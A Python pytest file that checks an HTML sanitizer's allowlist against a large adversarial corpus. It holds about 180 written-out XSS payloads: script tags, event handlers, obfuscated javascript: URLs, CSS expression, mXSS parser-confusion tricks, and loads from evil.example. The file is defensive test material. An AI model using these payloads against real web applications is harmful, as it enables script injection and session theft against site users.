"""The html part's nh3 allowlist, proven against an adversarial corpus (S2, TS-3).

Michael's ruling: strictness is PROVEN here, never relaxed to make content pass.
Three layers, each independent of the others:

1. `test_allowlist_is_exactly_the_documented_one` freezes the allowlist. Widening
   it is a deliberate edit of BOTH this file and `htmlsanitize.py`.
2. Every hostile case must be REFUSED by the full save-time validation, and the
   sanitizer's own output for it must be inert by an INDEPENDENT checker
   (`assert_inert`, which shares no code with the module under test), so a bug in
   the refuse/accept comparison cannot let unsanitized markup be stored.
3. The benign controls must be ACCEPTED, so refusal is not vacuous, and the
   sanitizer output must be idempotent.
"""

# ruff: noqa: E501, RUF001 - the corpus is data; long lines and look-alike
# characters are the point.

from __future__ import annotations

import html as html_lib
import re
from html.parser import HTMLParser

import pytest
from dotmac_template_studio import htmlsanitize
from dotmac_template_studio.contexts import RenderContext
from dotmac_template_studio.htmlsanitize import (
    HtmlSanitizationRefused,
    require_clean_html,
    sanitize_html,
)
from dotmac_template_studio.rendering import RenderRefusedError, render_part
from dotmac_template_studio.validation import validate_revision

CTX = RenderContext(
    name="d",
    variables=("name",),
    required=("link",),
    optional=("note",),
    url=("link", "item_url"),
    lists={"items": ("title", "item_url")},
)

# ── Layer 1: the allowlist, frozen ──────────────────────────────────────────

FROZEN_TAGS = (
    "a b strong i em u s small sub sup br hr p div span blockquote pre code "
    "ul ol li table thead tbody tfoot tr td th caption img h1 h2 h3 h4 h5 h6"
)
FROZEN_ATTRIBUTES = {
    "*": {"style", "title", "lang", "dir"},
    "a": {"href"},
    "img": {"src", "alt", "width", "height"},
    "table": {"width", "border", "cellpadding", "cellspacing", "align"},
    "tr": {"align", "valign"},
    "td": {"width", "height", "align", "valign", "colspan", "rowspan"},
    "th": {"width", "height", "align", "valign", "colspan", "rowspan"},
}
FROZEN_STYLE = (
    "color background-color font-family font-size font-style font-weight "
    "line-height text-align text-decoration text-transform letter-spacing "
    "vertical-align width max-width height margin margin-top margin-right "
    "margin-bottom margin-left padding padding-top padding-right padding-bottom "
    "padding-left border border-top border-right border-bottom border-left "
    "border-color border-style border-width border-collapse border-spacing "
    "border-radius list-style-type"
)
FROZEN_SCHEMES = {"http", "https", "mailto"}


def test_allowlist_is_exactly_the_documented_one() -> None:
    assert set(htmlsanitize.ALLOWED_TAGS) == set(FROZEN_TAGS.split())
    assert {k: set(v) for k, v in htmlsanitize.ALLOWED_ATTRIBUTES.items()} == (
        FROZEN_ATTRIBUTES
    )
    assert set(htmlsanitize.ALLOWED_STYLE_PROPERTIES) == set(FROZEN_STYLE.split())
    assert set(htmlsanitize.ALLOWED_URL_SCHEMES) == FROZEN_SCHEMES
    # The hard exclusions Michael named, and the obvious dangerous tags.
    for prop in ("position", "behavior", "expression", "background", "filter"):
        assert prop not in htmlsanitize.ALLOWED_STYLE_PROPERTIES
    for tag in ("script", "style", "iframe", "object", "embed", "svg", "form", "base"):
        assert tag not in htmlsanitize.ALLOWED_TAGS
        assert htmlsanitize.ALLOWED_TAGS.isdisjoint(htmlsanitize.CLEAN_CONTENT_TAGS)


# ── Layer 2: the independent inertness checker ──────────────────────────────

_BAD_VALUE_WORDS = ("javascript", "vbscript", "expression", "behavior", "@import")


class _Inert(HTMLParser):
    def __init__(self) -> None:
        super().__init__(convert_charrefs=True)
        self.violations: list[str] = []

    def handle_starttag(self, tag, attrs):
        if tag not in FROZEN_TAGS.split():
            self.violations.append(f"tag {tag}")
        for name, value in attrs:
            allowed = FROZEN_ATTRIBUTES["*"] | FROZEN_ATTRIBUTES.get(tag, set())
            if name not in allowed:
                self.violations.append(f"attr {name} on {tag}")
            value = value or ""
            lowered = html_lib.unescape(value).lower()
            if any(w in lowered for w in _BAD_VALUE_WORDS):
                self.violations.append(f"value {name}={value!r}")
            if name in ("href", "src") and not re.match(
                r"^(https?://|mailto:|\{[a-z_]+\}$)", lowered
            ):
                self.violations.append(f"url {name}={value!r}")
            if name == "style":
                if "url(" in lowered or "\\" in lowered or "/*" in lowered:
                    self.violations.append(f"style {value!r}")
                for decl in value.split(";"):
                    if decl.strip() and decl.split(":")[0].strip().lower() not in (
                        FROZEN_STYLE.split()
                    ):
                        self.violations.append(f"style property {decl!r}")

    handle_startendtag = handle_starttag

    def handle_comment(self, data):
        self.violations.append("comment")

    def handle_decl(self, decl):
        if not decl.lower().startswith("doctype html"):
            self.violations.append(f"decl {decl}")

    def handle_pi(self, data):
        self.violations.append("pi")

    def unknown_decl(self, data):
        self.violations.append("cdata")


def assert_inert(output: str) -> None:
    parser = _Inert()
    parser.feed(output)
    parser.close()
    assert parser.violations == [], (output, parser.violations)
    assert "<!--" not in output and "<script" not in output.lower()


# ── The corpus ──────────────────────────────────────────────────────────────

HOSTILE: dict[str, str] = {
    # script / style / embedding / foreign content
    "script": "<script>alert(1)</script>",
    "script-upper": "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
    "script-nested-split": "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "script-in-p": "<p>hi<script>alert(1)</script></p>",
    "style-element": "<style>p{background:url(javascript:alert(1))}</style>",
    "style-import": "<style>@import 'https://evil.example/x.css';</style>",
    "iframe": '<iframe src="https://evil.example"></iframe>',
    "iframe-srcdoc": '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
    "object": '<object data="https://evil.example/x"></object>',
    "embed": '<embed src="https://evil.example/x">',
    "applet": "<applet code=x></applet>",
    "svg-script": "<svg><script>alert(1)</script></svg>",
    "svg-onload": "<svg onload=alert(1)>",
    "svg-use": '<svg><use href="data:image/svg+xml,x"></use></svg>',
    "math-href": '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    "math-maction": "<math><maction actiontype=statusline#http://x>y</maction></math>",
    "frameset": "<frameset><frame src=x></frameset>",
    "audio": "<audio src=x onerror=alert(1)>",
    "video": "<video><source onerror=alert(1)></video>",
    "button": "<button onclick=alert(1)>x</button>",
    "input": "<input autofocus onfocus=alert(1)>",
    "select": "<select><option>x</option></select>",
    # event handlers
    "onclick": '<p onclick="alert(1)">x</p>',
    "onerror-img": '<img src="https://e.example/x.png" onerror="alert(1)">',
    "onmouseover-mixed-case": '<p OnMouseOver="alert(1)">x</p>',
    "handler-no-quotes": "<p onclick=alert(1)>x</p>",
    "handler-tab-split": '<p on\tclick="alert(1)">x</p>',
    "handler-in-allowed-tag-table": "<table onclick=alert(1)><tr><td>x</td></tr></table>",
    "formaction": '<button formaction="javascript:alert(1)">x</button>',
    "form": '<form action="https://evil.example"><input name=a></form>',
    "form-formaction-input": '<form><input type=submit formaction="https://e.example"></form>',
    # URL schemes in href / src
    "href-javascript": '<a href="javascript:alert(1)">x</a>',
    "href-javascript-upper": '<a href="JAVASCRIPT:alert(1)">x</a>',
    "href-javascript-mixed": '<a href="JaVaScRiPt:alert(1)">x</a>',
    "href-javascript-entity-colon": '<a href="javascript&colon;alert(1)">x</a>',
    "href-javascript-numeric-entity": '<a href="&#106;avascript:alert(1)">x</a>',
    "href-javascript-hex-entity": '<a href="&#x6A;&#x61;vascript:alert(1)">x</a>',
    "href-javascript-no-semicolon": '<a href="&#106avascript:alert(1)">x</a>',
    "href-javascript-tab": '<a href="java&#x09;script:alert(1)">x</a>',
    "href-javascript-newline": '<a href="java&#x0A;script:alert(1)">x</a>',
    "href-javascript-cr": '<a href="java&#x0D;script:alert(1)">x</a>',
    "href-javascript-raw-tab": '<a href="java\tscript:alert(1)">x</a>',
    "href-javascript-leading-space": '<a href=" javascript:alert(1)">x</a>',
    "href-javascript-leading-control": '<a href="\x01javascript:alert(1)">x</a>',
    "href-javascript-nul": '<a href="java\x00script:alert(1)">x</a>',
    "href-javascript-zero-width": '<a href="java​script:alert(1)">x</a>',
    "href-vbscript": '<a href="vbscript:msgbox(1)">x</a>',
    "href-data-html": '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    "href-data-base64": '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
    "href-file": '<a href="file:///etc/passwd">x</a>',
    "href-ftp": '<a href="ftp://example.com/x">x</a>',
    "href-tel": '<a href="tel:+10000000000">x</a>',
    "href-relative": '<a href="/relative/path">x</a>',
    "href-protocol-relative": '<a href="//evil.example/x">x</a>',
    "href-fragment": '<a href="#anchor">x</a>',
    "href-backslash": '<a href="https:\\\\evil.example">x</a>',
    "href-placeholder-with-suffix": '<a href="{link}?x=1">x</a>',
    "href-placeholder-with-prefix": '<a href="x{link}">x</a>',
    "href-http-without-host": '<a href="http:///x">x</a>',
    "href-empty-mailto": '<a href="mailto:">x</a>',
    "href-unquoted": "<a href=javascript:alert(1)>x</a>",
    "href-single-quote-break": "<a href='x' onclick='alert(1)'>x</a>",
    "href-double-attr": '<a href="https://ok.example" href="javascript:alert(1)">x</a>',
    "href-with-quote-break": '<a href="https://e.example/&quot; onclick=&quot;alert(1)">x</a>',
    "src-javascript": '<img src="javascript:alert(1)">',
    "src-data": '<img src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">',
    "src-mailto": '<img src="mailto:a@b.example">',
    "src-relative": '<img src="/x.png">',
    "src-srcset": '<img src="https://e.example/a.png" srcset="javascript:alert(1) 1x">',
    "src-dynsrc": '<img dynsrc="javascript:alert(1)">',
    "src-lowsrc": '<img lowsrc="javascript:alert(1)">',
    "img-ismap-usemap": '<img src="https://e.example/a.png" usemap="#m">',
    "img-tag-name-slash": "<img/src='x'onerror=alert(1)>",
    "background-attr": '<table background="javascript:alert(1)"><tr><td>x</td></tr></table>',
    "xlink": '<a xlink:href="javascript:alert(1)">x</a>',
    "action-attr": '<a action="javascript:alert(1)">x</a>',
    "ping": '<a href="https://e.example" ping="https://t.example">x</a>',
    "target": '<a href="https://e.example" target="_blank">x</a>',
    "rel": '<a href="https://e.example" rel="opener">x</a>',
    "id-clobber": '<a id="x" href="https://e.example">x</a>',
    "class-attr": '<p class="x">x</p>',
    "name-attr": '<a name="x">x</a>',
    "data-attr": '<p data-x="y">x</p>',
    "aria-attr": '<p aria-label="y">x</p>',
    "accesskey": '<a accesskey="x" href="https://e.example">x</a>',
    "contenteditable": "<p contenteditable>x</p>",
    "is-attr": '<p is="x-y">x</p>',
    "srcdoc-attr": '<p srcdoc="<script>">x</p>',
    # CSS
    "css-expression": '<p style="width:expression(alert(1))">x</p>',
    "css-expression-comment": '<p style="width:exp/**/ression(alert(1))">x</p>',
    "css-expression-escape": '<p style="width:\\65xpression(alert(1))">x</p>',
    "css-url": '<p style="background-color:url(https://e.example/x.png)">x</p>',
    "css-url-javascript": '<p style="color:url(javascript:alert(1))">x</p>',
    "css-url-escape": '<p style="color:\\75rl(x)">x</p>',
    "css-background-image": '<p style="background-image:url(https://e.example/x)">x</p>',
    "css-background-shorthand": '<p style="background:url(x)">x</p>',
    "css-import": '<p style="color:red;@import url(x)">x</p>',
    "css-behavior": '<p style="behavior:url(x.htc)">x</p>',
    "css-moz-binding": '<p style="-moz-binding:url(x)">x</p>',
    "css-position-fixed": '<p style="position:fixed;top:0;left:0">x</p>',
    "css-position-absolute": '<p style="color:red;position:absolute">x</p>',
    "css-position-upper": '<p style="POSITION:fixed">x</p>',
    "css-z-index": '<p style="z-index:9999">x</p>',
    "css-content": '<p style="content:attr(x)">x</p>',
    "css-calc": '<p style="width:calc(100% - 1px)">x</p>',
    "css-var": '<p style="color:var(--x)">x</p>',
    "css-important": '<p style="color:red !important">x</p>',
    "css-comment": '<p style="color:/*x*/red">x</p>',
    "css-url-in-font-family": "<p style=\"font-family:url('x')\">x</p>",
    "css-semicolon-injection": '<p style="color:red;}</style><script>alert(1)</script>">x</p>',
    "css-quote-break": "<p style=\"font-family:'a\\');alert(1)//\">x</p>",
    "css-javascript-word": '<p style="color:javascript:alert(1)">x</p>',
    "css-huge": '<p style="color:red' + ";color:red" * 400 + '">x</p>',
    # head-level / document-level
    "meta-refresh": '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    "meta-refresh-in-body": '<p>x</p><meta http-equiv="refresh" content="0;url=https://e.example">',
    "base-href": '<base href="https://evil.example/"><a href="x">x</a>',
    "link-rel": '<link rel="stylesheet" href="https://e.example/x.css">',
    "title-element": "<title>x</title>",
    "html-body-wrapper": "<html><body><p>x</p></body></html>",
    "head-element": "<html><head><style>p{}</style></head><body>x</body></html>",
    "body-onload": "<body onload=alert(1)>",
    "xml-prolog": '<?xml version="1.0"?><p>x</p>',
    "doctype-other": '<!DOCTYPE html SYSTEM "about:legacy-compat"><p>x</p>',
    "doctype-xhtml-strict": (
        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" '
        '"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><p>x</p>'
    ),
    "doctype-twice": "<!doctype html><!doctype html><p>x</p>",
    "doctype-mid": "<p>x</p><!doctype html>",
    "doctype-with-entity": '<!DOCTYPE html [<!ENTITY x "y">]><p>x</p>',
    # comments / CDATA / conditional comments / PIs
    "comment": "<p>x</p><!-- hidden -->",
    "comment-script": "<!--<script>alert(1)</script>-->",
    "comment-break": "<!--><script>alert(1)</script>-->",
    "comment-break-2": "<!---><script>alert(1)</script>-->",
    "comment-bang-end": "<!-- x --!><script>alert(1)</script>",
    "conditional-mso": "<!--[if mso]><table><tr><td>x</td></tr></table><![endif]-->",
    "conditional-downlevel": "<![if !IE]><p>x</p><![endif]>",
    "conditional-script": "<!--[if gte IE 4]><script>alert(1)</script><![endif]-->",
    "cdata": "<![CDATA[<script>alert(1)</script>]]>",
    "cdata-in-svg": "<svg><![CDATA[><script>alert(1)</script>]]></svg>",
    "bogus-comment-question": "<?php echo 1 ?>",
    "bogus-comment-end-tag": "</ x><script>alert(1)</script>",
    "bogus-comment-end-digit": "</1><script>alert(1)</script>",
    "bogus-comment-bang": "<!x><script>alert(1)</script>",
    "sentinel-forgery": "<!--ts0--><table><tr><td>x</td></tr></table>",
    "sentinel-forgery-section": "<!--ts0-->{#items}x{/items}",
    # mXSS / parser differentials
    "mxss-noscript": '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    "mxss-noscript-style": "<noscript><style></noscript><img src=x onerror=alert(1)></style></noscript>",
    "mxss-template": "<template><script>alert(1)</script></template>",
    "mxss-template-nesting": '<template><p title="</template><img src=x onerror=alert(1)>"></template>',
    "mxss-textarea": '<textarea><p title="</textarea><img src=x onerror=alert(1)>"></textarea>',
    "mxss-textarea-nested": "<textarea><textarea></textarea><img src=x onerror=alert(1)></textarea>",
    "mxss-title": "<title><img src=x onerror=alert(1)></title>",
    "mxss-xmp": '<xmp><p title="</xmp><img src=x onerror=alert(1)>">',
    "mxss-plaintext": "<plaintext><script>alert(1)</script>",
    "mxss-listing": "<listing><img src=x onerror=alert(1)></listing>",
    "mxss-noembed": "<noembed><img src=x onerror=alert(1)></noembed>",
    "mxss-noframes": "<noframes><img src=x onerror=alert(1)></noframes>",
    "mxss-iframe-raw": "<iframe><img src=x onerror=alert(1)></iframe>",
    "mxss-select-style": "<select><style><img src=x onerror=alert(1)></style></select>",
    "mxss-svg-style": "<svg><style><img src=x onerror=alert(1)></style></svg>",
    "mxss-svg-title-desc": "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>",
    "mxss-math-style": "<math><mtext><style><img src=x onerror=alert(1)></style></mtext></math>",
    "mxss-math-mglyph": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
    "mxss-namespace-confusion": '<math><mi><mglyph><svg><mtext><style><a title="</style><img src onerror=alert(1)>">',
    "mxss-form-nesting": "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",
    "mxss-table-foster": "<table><img src=x onerror=alert(1)></table>",
    "mxss-table-script": "<table><script>alert(1)</script></table>",
    "mxss-table-style": "<table><style></style><tr><td>x</td></tr></table>",
    "mxss-p-svg": "<p><svg></p><img src=x onerror=alert(1)>",
    "mxss-br-end-tag": "</br><img src=x onerror=alert(1)>",
    "mxss-nested-formatting": "<b><p><b></p><img src=x onerror=alert(1)>",
    "mxss-attr-backtick": "<p title=`x onerror=alert(1)`>x</p>",
    "mxss-attr-entity-lt": '<p title="&lt;img src=x onerror=alert(1)&gt;">x</p>',
    "mxss-attr-end-tag-in-value": '<p title="</p><script>alert(1)</script>">x</p>',
    "mxss-attr-gt-in-value": '<p title="x><script>alert(1)</script>">x</p>',
    "mxss-image-tag": "<image src=x onerror=alert(1)>",
    "mxss-isindex": "<isindex action=javascript:alert(1)>",
    "mxss-keygen": "<keygen autofocus onfocus=alert(1)>",
    "mxss-marquee": "<marquee onstart=alert(1)>x</marquee>",
    "mxss-details-ontoggle": "<details open ontoggle=alert(1)>x</details>",
    "mxss-nul-in-tag": "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "mxss-nul-in-attr": '<p on\x00click="alert(1)">x</p>',
    "mxss-unterminated-tag": "<img src=x onerror=alert(1)",
    "mxss-unterminated-attr": '<a href="https://e.example',
    "mxss-lt-then-script": "<<script>script>alert(1)<</script>/script>",
    "attr-quote-break-double": '<p title="x" onclick="alert(1)" x="">x</p>',
    "attr-quote-break-single": "<p title='x' onclick='alert(1)'>x</p>",
    "attr-slash-separator": '<p title="x"/onclick="alert(1)">x</p>',
    "attr-no-space": '<p title="x"onclick="alert(1)">x</p>',
    "attr-equals-garbage": '<p ="x" onclick=alert(1)>x</p>',
    "attr-long-name": "<p " + "a" * 200 + '="x">x</p>',
    "tag-long-name": "<" + "a" * 200 + ">x",
    # placeholder-in-markup attempts that the S1 scanner handles, kept here so the
    # combined pipeline is exercised end to end
    "placeholder-in-attr": '<p title="{name}">x</p>',
    "placeholder-in-tag-name": "<{name}>x",
    "placeholder-in-style": '<p style="color:{name}">x</p>',
    "placeholder-in-comment": "<!-- {name} -->",
    "placeholder-in-script": "<script>{name}</script>",
    "section-in-attr": '<p title="{#items}x{/items}">x</p>',
    "section-split-tag": "<p {#items}title=x{/items}>x</p>",
    # unicode / encoding games
    "fullwidth-script": "<ｓｃｒｉｐｔ>alert(1)</ｓｃｒｉｐｔ>",
    "rtl-override-href": '<a href="‮javascript:alert(1)">x</a>',
    "nbsp-in-scheme": '<a href="java&nbsp;script:alert(1)">x</a>',
    "utf7": "+ADw-script+AD4-alert(1)+ADw-/script+AD4-<script>alert(1)</script>",
    "overlong-nesting-script": "<div>" * 50
    + "<script>alert(1)</script>"
    + "</div>" * 50,
}

# Look hostile, are not: the quoting holds, so the text stays inside one attribute
# value or one URL. Accepted, and proven inert, rather than refused for show.
INERT_LOOKALIKES: dict[str, str] = {
    "attr-quote-break-mixed": "<p title=\"x'onclick='alert(1)\">x</p>",
    "mxss-attr-double-encoded": '<p title="&amp;lt;script&amp;gt;">x</p>',
    "onload-slash": "<img/src=https://e.example/x/onload=alert(1)>",
}

# Cases the combined pipeline must ACCEPT: refusal is not vacuous.
BENIGN: dict[str, str] = {
    "plain-text": "just text {name}",
    "paragraph": "<p>Hello {name}</p>",
    "formatting": "<p><b>a</b> <i>b</i> <u>c</u> <s>d</s><br/><small>e</small></p>",
    "link-literal": '<a href="https://example.com/a?b=1&amp;c=2">x</a>',
    "link-mailto": '<a href="mailto:help@example.com">mail</a>',
    "link-placeholder": '<a href="{link}">{name}</a>',
    "image-placeholder": '<img src="{link}" alt="logo" width="120" height="40">',
    "image-https": '<img src="https://example.com/a.png" alt="a">',
    "styled-paragraph": (
        "<p style=\"color:#333333;font-family:Arial, 'Helvetica Neue', sans-serif;"
        'font-size:14px;line-height:1.5;margin:0 0 10px 0">{name}</p>'
    ),
    "styled-rgb": '<p style="color: rgb(10, 20, 30); background-color: #fff">x</p>',
    "layout-table": (
        '<table width="600" border="0" cellpadding="0" cellspacing="0" align="center">'
        '<tr><td align="center" style="padding:10px">{name}</td></tr></table>'
    ),
    "explicit-tbody": "<table><tbody><tr><td>x</td></tr></tbody></table>",
    "list-section-rows": (
        '<table><tr><th>Item</th></tr>{#items}<tr><td><a href="{item_url}">{title}</a>'
        "</td></tr>{/items}</table>"
    ),
    "list-section-ul": "<ul>{#items}<li>{title}</li>{/items}{^items}<li>none</li>{/items}</ul>",
    "optional-section": "{#note}<p>{note}</p>{/note}",
    "entities": "<p>&copy; &amp; &lt;b&gt; &nbsp;&mdash;</p>",
    "headings": "<h1>a</h1><h2>b</h2><h3>c</h3>",
    "doctype-html": "<!DOCTYPE html><p>{name}</p>",
    "doctype-xhtml-transitional": (
        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" '
        '"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><p>{name}</p>'
    ),
}


def _full(src: str) -> list[str]:
    """Html problems of the full save-time validation (S1 scanner + sanitizer)."""
    return [
        p
        for p in validate_revision(CTX, text="{link}", html=src)
        if p.startswith("html:") and "required variable" not in p
    ]


@pytest.mark.parametrize("case_id", sorted(HOSTILE))
def test_hostile_markup_is_refused_and_its_cleaned_form_is_inert(case_id: str) -> None:
    src = HOSTILE[case_id]
    problems = _full(src)
    assert problems, f"{case_id} was ACCEPTED: {src!r}"
    # Independent of the refusal: whatever the sanitizer would have stored is inert.
    assert_inert(sanitize_html(src).html)


@pytest.mark.parametrize("case_id", sorted(HOSTILE))
def test_the_sanitizer_alone_refuses_or_stores_only_inert_html(case_id: str) -> None:
    """The sanitizer API on its own, without the placeholder scanner in front."""
    try:
        stored = require_clean_html(HOSTILE[case_id])
    except HtmlSanitizationRefused:
        return
    assert_inert(stored)  # accepted only because it was already harmless text


def test_the_hostile_corpus_is_not_vacuous() -> None:
    assert len(HOSTILE) >= 180
    # Every family the ruling names is represented.
    joined = " ".join(HOSTILE)
    for family in (
        "script",
        "style",
        "iframe",
        "object",
        "embed",
        "svg",
        "math",
        "onclick",
        "javascript",
        "data",
        "vbscript",
        "entity",
        "expression",
        "url",
        "import",
        "behavior",
        "srcset",
        "form",
        "meta-refresh",
        "base-href",
        "comment",
        "cdata",
        "conditional",
        "noscript",
        "template",
        "textarea",
        "namespace",
        "quote-break",
    ):
        assert family in joined, family


@pytest.mark.parametrize("case_id", sorted(INERT_LOOKALIKES))
def test_lookalikes_stay_inside_one_value(case_id: str) -> None:
    stored = require_clean_html(INERT_LOOKALIKES[case_id])
    assert_inert(stored)
    assert "onclick=" not in re.sub(r'"[^"]*"', "", stored)
    assert "onload=" not in re.sub(r'"[^"]*"', "", stored)


@pytest.mark.parametrize("case_id", sorted(BENIGN))
def test_benign_markup_is_accepted_and_idempotent(case_id: str) -> None:
    src = BENIGN[case_id]
    assert _full(src) == [], case_id
    stored = require_clean_html(src)
    assert_inert(stored)
    again = sanitize_html(stored)
    assert again.problems == () and again.html == stored


def test_sections_survive_inside_table_rows_in_order() -> None:
    stored = require_clean_html(BENIGN["list-section-rows"])
    assert stored.index("{#items}") < stored.index("<tr><td>")
    assert stored.index("{/items}") > stored.index("</td></tr>")
    assert stored.index("<table>") < stored.index("{#items}")  # not fostered out


def test_what_was_removed_is_reported() -> None:
    result = sanitize_html(
        '<p onclick="x()" style="color:red;position:fixed">a</p><script>x</script>'
    )
    text = " | ".join(result.problems)
    assert "<script> removed with its content" in text
    assert "'onclick' removed from <p>" in text
    assert "position" in text
    with pytest.raises(HtmlSanitizationRefused, match="nothing was removed or stored"):
        require_clean_html("<script>x</script>")


def test_a_parser_rewrite_that_moves_text_is_refused_not_stored() -> None:
    # A stray end tag makes html5 build a different tree than was written.
    assert sanitize_html("<b>x</p>").problems


# ── Doctype ─────────────────────────────────────────────────────────────────


def test_xhtml_transitional_doctype_is_accepted_by_exact_string_only() -> None:
    good = BENIGN["doctype-xhtml-transitional"]
    assert require_clean_html(good).startswith("<!DOCTYPE html PUBLIC")
    # Case of the keyword does not matter; the rest is an exact match.
    assert _full(good.replace("DOCTYPE", "doctype")) == _full(good)
    for bad in (
        good.replace("Transitional", "Strict"),
        good.replace("//EN", "//DE"),
        good.replace("http://www.w3.org", "https://www.w3.org"),
        good.replace("<!DOCTYPE html PUBLIC", "<!DOCTYPE  html PUBLIC"),
        good.replace(">", " >", 1),
        "<!DOCTYPE html PUBLIC>" + "<p>{name}</p>",
    ):
        assert _full(bad), bad
    # A placeholder cannot be smuggled into the declaration.
    split = good.replace("XHTML 1.0", "{name}")
    assert _full(split)


# ── Defence in depth at render time ─────────────────────────────────────────

HOSTILE_VALUES = [
    "<script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)",
    "' onmouseover='alert(1)",
    "</a><script>alert(1)</script>",
    "&lt;script&gt;",
    "‮<b>",
    'https://e.example/?a=1&b=2"><script>',
    "{#items}{/items}{name}",
]


@pytest.mark.parametrize("value", HOSTILE_VALUES)
def test_hostile_values_render_inert_into_a_sanitized_skeleton(value: str) -> None:
    skeleton = require_clean_html(
        '<p style="color:red">{name}</p><a href="{link}">{name}</a>'
        "<ul>{#items}<li>{title}</li>{/items}</ul>"
    )
    values = {
        "name": value,
        "link": "https://example.com/x?a=1&b=2",
        "items": [{"title": value, "item_url": "https://example.com/i"}],
    }
    rendered = render_part(skeleton, values, "html", context=CTX)
    assert_inert(rendered)
    # Nothing in the value became markup: only the skeleton's own tags exist.
    assert set(re.findall(r"<([a-z]+)", rendered)) <= {"p", "a", "ul", "li"}


@pytest.mark.parametrize(
    "link",
    ["javascript:alert(1)", "data:text/html,x", "//e.example", "/x", "https:///x"],
)
def test_a_hostile_url_value_is_refused_at_render(link: str) -> None:
    skeleton = require_clean_html('<a href="{link}">x</a>')
    with pytest.raises(RenderRefusedError):
        render_part(skeleton, {"link": link}, "html", context=CTX)
